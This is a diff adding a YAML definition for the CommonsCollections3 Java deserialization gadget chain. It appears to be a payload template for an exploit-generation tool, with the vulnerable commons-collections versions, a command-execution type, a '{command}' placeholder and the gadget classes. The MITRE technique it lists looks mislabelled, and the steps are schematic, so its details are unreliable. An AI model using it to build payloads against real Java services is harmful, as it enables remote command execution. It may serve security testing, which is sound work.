@@ -1,0 +1,24 @@
+name: "CommonsCollections3"
+category: "commons_collections"
+description: "CommonsCollections3 gadget chain using TemplatesImpl and InstantiateTransformer"
+jdk_version: "all"
+dependencies:
+  - name: "commons-collections"
+    version: "3.1-3.2.1"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.apache.commons.collections.functors.InstantiateTransformer"
+    method_name: "transform"
+    parameters: []
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "newTransformer"
+    parameters:
+      - "{command}"
+  - class_name: "org.apache.commons.collections.map.LazyMap"
+    method_name: "decorate"
+    parameters: []
